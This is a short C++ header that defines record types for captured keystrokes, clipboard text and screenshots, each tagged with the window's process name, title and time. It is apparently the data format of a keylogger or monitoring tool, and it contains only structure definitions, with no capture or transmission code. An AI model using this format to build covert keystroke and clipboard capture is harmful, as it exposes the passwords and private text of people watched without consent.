#ifndef LRCDATA_LRCDATATYPES
#define LRCDATA_LRCDATATYPES
#define LRCDATA_HEADER_SIZE 0x48
#include <vector>
#include <list>
#include <string>
#include <cstdint>

namespace LRCData
{
	typedef std::vector<uint8_t> ByteVector;

	enum Type
	{
		keyboard = 0x1,
		clipboard = 0x2,
		screenshot = 0x3
	};

	struct Header
	{
		uint16_t signature;
		uint8_t version;
		char id[65];
		uint8_t type;
		uint32_t length;
	};

	struct VKInfo
	{
		uint32_t keyCode;
		uint16_t lang;
		uint8_t flags;
	};

	struct WNDInfo
	{
		uint32_t time;
		std::wstring process;
		std::wstring title;
	};

	struct Keyboard
	{
		WNDInfo wndInfo;
		std::list<VKInfo> keys;
	};

	struct Clipboard
	{
		WNDInfo wndInfo;
		std::wstring data;
	};
}

#endif // !LRCDATA_LRCDATATYPES
